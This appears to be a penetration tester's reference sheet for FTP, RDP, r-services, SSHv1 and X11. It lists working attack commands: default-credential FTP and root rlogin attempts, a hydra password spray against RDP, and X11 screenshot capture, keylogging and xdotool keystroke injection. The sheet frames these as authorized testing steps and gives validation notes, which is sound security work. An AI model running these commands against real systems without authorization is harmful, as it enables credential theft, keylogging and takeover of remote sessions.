# FTP

## Overview

FTP sends credentials in cleartext. Test default accounts, non-standard ports, and missing TLS (AUTH).

## Commands

Interactive with defaults:
    ftp admin@<target IP>
    # user: admin, password: (empty) or admin

Telnet to port 21:
    telnet <target IP> 21
    user admin
    pass
    id;

Non-standard port:
    ftp <target IP> <port>

Check for TLS support:
    telnet <target IP> 21
    AUTH TLS
    # 234 = TLS supported; 502/530 = not supported or rejected

## Validation / False Positives

Anonymous FTP with only public content is low severity — demonstrate upload or sensitive file read for impact.
AUTH rejection alone is informational if cleartext login still works.


# Remote Desktop

## Overview

RDP on 3389 may allow password spraying or weak local administrator passwords.

## Commands

    hydra -t 4 -V -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<target IP>

## Validation / False Positives

Account lockout policies apply — throttle attempts and confirm scope before large sprays.


# Rservices

## Overview

rlogin, rsh, and rexec (512–514/tcp) trust host-based authentication and often permit root without a password.

## Commands

    apt install rsh-client
    rlogin -l root <target IP>
    rsh root@<target IP>
    rexec -l root <target IP> id

nmap:
    nmap -p512-514 --script=rpc-grind <target IP>

## Validation / False Positives

Open TCP ports without a working rsh/rlogin daemon are not findings — capture successful shell or command execution.


# SSHv1

## Overview

SSH protocol version 1 has known cryptographic weaknesses. Modern servers should negotiate v2 only.

## Commands

    nmap -Pn -n -T4 -p22 --script=sshv1 <target IP>

Force v1 (if server allows):
    ssh -1 <target IP>

## Validation / False Positives

Banner reporting "1.99" often means the server supports both v1 and v2 — confirm whether a v1 handshake actually completes.


# X11

## Overview

Unauthenticated X11 forwarding exposes the desktop — screenshot, keylogging, and remote input injection. See linux.txt for xspy compile notes and situational-awareness context.

## Commands

Discover open displays:
    nmap -Pn -n -T4 -p6000-6010 --script=x11-access <target IP>

xspy:
    xspy <target IP>

Screenshot:
    xwd -display <target IP>:0 -root -out file.xwd
    xwud -in file.xwd

Keylogging:
    xkey <target IP>:0.0

Inject keystrokes (attacker terminal):
    export DISPLAY=<target IP>:0
    xdotool key x t e r m
    xdotool key KP_Enter

One character at a time if needed:
    xdotool key x
    xdotool key t
    xdotool key e
    xdotool key r
    xdotool key m

On newer Ubuntu hosts, ydotool may be required instead of xdotool.

## Validation / False Positives

An open TCP port on 6000+n is not X11 access — demonstrate capture or input control on the active display.
xhost + entries may be intentional in lab environments — document actual data exposed.
